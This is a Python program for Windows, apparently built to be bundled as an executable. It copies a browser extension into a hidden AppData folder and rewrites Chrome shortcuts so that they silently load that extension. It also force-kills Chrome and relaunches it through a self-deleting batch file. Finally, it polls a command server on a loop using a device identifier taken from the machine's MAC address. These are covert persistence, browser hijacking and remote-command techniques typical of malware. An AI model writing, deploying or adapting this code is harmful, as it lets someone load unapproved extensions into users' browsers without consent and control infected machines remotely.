import os
import sys
import shutil
import winshell
from pathlib import Path
import time
import subprocess
import requests
import uuid
import socket

if getattr(sys, 'frozen', False):
    current_directory = Path(sys._MEIPASS)
else:
    current_directory = Path(__file__).parent

internal_extension_path = current_directory / "extension"
external_extension_path = Path(os.environ['APPDATA']) / ".hidden_extension" / "extension"

try:
    if not external_extension_path.exists():
        external_extension_path.parent.mkdir(parents=True, exist_ok=True)
        shutil.copytree(internal_extension_path, external_extension_path)
        print(f"Extension folder copied to: {external_extension_path}")
except Exception as e:
    print(f"Failed to copy extension folder: {e}")
    sys.exit(1)

def get_device_identifier():
    try:
        return hex(uuid.getnode())
    except Exception as e:
        print(f"Error getting device identifier: {e}")
        return socket.gethostname()

def update_shortcut(shortcut_path, extension_folder_path):
    try:
        with winshell.shortcut(shortcut_path) as link:
            if link.path and "chrome.exe" in link.path.lower():
                link.arguments = f'--load-extension="{extension_folder_path}"'
                print(f"Updated shortcut: {shortcut_path}")
            else:
                print(f"Skipped shortcut (not Chrome): {shortcut_path}")
    except Exception as e:
        print(f"Error updating shortcut {shortcut_path}: {e}")

def restart_chrome_via_shortcut(shortcut_path):
    try:
        subprocess.call("taskkill /im chrome.exe /f", shell=True)
        print("Chrome processes terminated successfully.")
    except Exception as e:
        print(f"Failed to terminate Chrome processes: {e}")
        return

    print("Chrome will restart in 3 minutes with the extension...")
    time.sleep(180)

    bat_file = external_extension_path / "launch_chrome.bat"
    with open(bat_file, "w") as f:
        f.write(f'start "" "{shortcut_path}"\n')
        f.write("exit\n")

    try:
        subprocess.Popen([str(bat_file)], shell=True)
        print("Chrome restarted with the extension via shortcut.")
    except Exception as e:
        print(f"Failed to restart Chrome via shortcut: {e}")
    finally:
        time.sleep(5)
        if bat_file.exists():
            bat_file.unlink()

def update_chrome_shortcuts(extension_folder_path):
    if not Path(extension_folder_path).exists():
        print(f"Error: The specified extension folder was not found: {extension_folder_path}")
        return

    desktop_path = Path(os.path.join(os.environ['USERPROFILE'], 'Desktop'))
    public_desktop_path = Path("C:/Users/Public/Desktop")
    start_menu_path = Path(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'))

    possible_shortcut_names = ["Google Chrome.lnk", "Chrome.lnk"]
    last_valid_shortcut = None

    for shortcut_name in possible_shortcut_names:
        potential_desktop_shortcut = desktop_path / shortcut_name
        if potential_desktop_shortcut.exists():
            update_shortcut(str(potential_desktop_shortcut), str(extension_folder_path))
            last_valid_shortcut = potential_desktop_shortcut

        potential_public_desktop_shortcut = public_desktop_path / shortcut_name
        if potential_public_desktop_shortcut.exists():
            update_shortcut(str(potential_public_desktop_shortcut), str(extension_folder_path))
            last_valid_shortcut = potential_public_desktop_shortcut

        for path in start_menu_path.rglob(shortcut_name):
            update_shortcut(str(path), str(extension_folder_path))
            last_valid_shortcut = path

    if last_valid_shortcut:
        print("Chrome will restart in 3 minutes with the extension...")
        restart_chrome_via_shortcut(str(last_valid_shortcut))
    else:
        print("No valid Chrome shortcut found for updating and restarting.")

def wait_for_commands():
    SERVER_URL = "http://127.0.0.1:5000/api/commands"
    device_id = get_device_identifier()

    while True:
        try:
            print("Waiting for commands from server...")
            response = requests.get(
                SERVER_URL,
                params={"device_id": device_id},
                proxies={"http": None, "https": None}
            )
            response.raise_for_status()
            command_data = response.json()
            command = command_data.get("command")

            if command:
                print(f"Received command: {command}")
                if command == "restart_chrome":
                    update_chrome_shortcuts(external_extension_path)
                else:
                    print(f"Command '{command}' not handled.")
            else:
                print("No command received.")

        except Exception as e:
            print(f"Error while requesting commands: {e}")

        time.sleep(30)

if __name__ == "__main__":
    print("Program started.")

    update_chrome_shortcuts(external_extension_path)
    wait_for_commands()
